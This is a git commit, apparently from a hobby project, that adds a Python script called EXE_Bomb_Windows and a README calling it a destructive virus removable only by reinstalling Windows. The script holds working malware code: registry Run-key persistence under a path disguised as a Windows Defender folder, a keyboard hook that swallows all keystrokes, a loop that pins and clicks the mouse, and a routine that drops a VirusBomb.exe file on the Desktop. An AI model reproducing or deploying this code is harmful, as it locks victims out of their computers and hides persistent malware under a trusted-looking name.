76b7693097015adbc154fa34add2c8521265298b
SebastiánEPH <sebastianeph99@gmail.com>
2020-05-09 22:31:38 -0500

    se auto inicia

---
+++ EXE_Bomb_Windows.py
@@ -0,0 +1,81 @@
+# v1.0
+from pynput.mouse import Button, Controller  # Importa librería Mouse
+import pythoncom, pyHook 
+from winreg import *
+import os 
+from getpass import getuser 
+from multiprocessing import Process
+import threading
+      
+def addStartup():  # function =  Iniciar automaticamente
+    path = r"C:\Users\Public\Security\Windows Defender\EXE_Bomb_Windows.exe"        # Path del Software completo
+    name = "EXE_Bomb_Windows"                                                       # Nombre del StartUp
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
+    def verificar():    # Evita que se créen 2 veces el Bom
+        try:  # Intenta crear la dirección
+            os.makedirs('C:\\Users\\Public\\EXEBombWindows\\Boom')
+            return True # Se creó la carpeta
+        except:
+            return False# La carpeta ya existe
+    try:    # Solo si tiene permisos de administrador
+        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # machine
+        SetValueEx(registry,name, 0, REG_SZ, path)
+        verificar() # Crea Carpeta
+    except: # Si no tien permisos de administrador
+        if (verificar()):
+            registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS) # local
+            SetValueEx(registry,name, 0, REG_SZ, path)          
+def Block():    # Lib [KeyandMouse_Block]
+    mouse = Controller()  
+    def BlockMouse():
+        mouse.position = (0, 0) # el mouse se va a la posición 0,0 de la pantalla
+        #mouse.press(Button.right)
+        #mouse.release(Button.right)
+        mouse.press(Button.left)
+        mouse.release(Button.left)
+        
+    k = pyHook.HookManager()
+    while(True):
+        def e(event):
+            return False
+        BlockMouse()                # Bloquea el mouse
+        k.KeyAll = e
+        k.HookKeyboard()
+        pythoncom.PumpMessages()    # Bloquea Teclado
+
+def CreateFiles():  #Crea block de notas en el escritorio
+    try:  # Intenta crear la dirección
+        os.makedirs('C:\\Users\\'+str(getuser())+'\\Desktop')
+    except:
+        pass
+    log = os.environ.get(
+        'pylogger_file',
+        os.path.expanduser('C:\\Users\\'+str(getuser())+'\\Desktop\\VirusBomb.exe')
+        )
+    with open (log, "a") as f:
+        f.write("[Escribe el Texto oculto dentro del EXE]") #Escribe el Texto que irá dentro de los txt
+def saturar():
+    pass
+
+
+
+
+
+if __name__ == '__main__':
+    #Block()                             # Bloquea Teclado y mouse
+    #addStartup()
+     # Hilos
+    h1= threading.Thread(target=CreateFiles)   # C
+    h1.start()
+    
+    
+    """
+    p1 = Process(target=a)     #  Inicia automaticamente
+    p2 = Process(target=B)          # 
+    p2.start()
+    p1.start()
+    """
+    
+    #p1.join()
+    #p2.join()
+
--- README.md
+++ README.md
@@ -1,1 +1,8 @@
-En desarrollo...
+Virus...
+
+# Advertencia
+Ésta herramienta es destructiva, usarlo bajo sus propio criterio,una vez el software instalado, la unica manera de borrarlo es reinstalando windows 
+
+Librerías utilizada:__
+
+__Lib:__  [KeyAndMouse_Block](https://github.com/SebastianEPH/KeyAndMouse_Block)
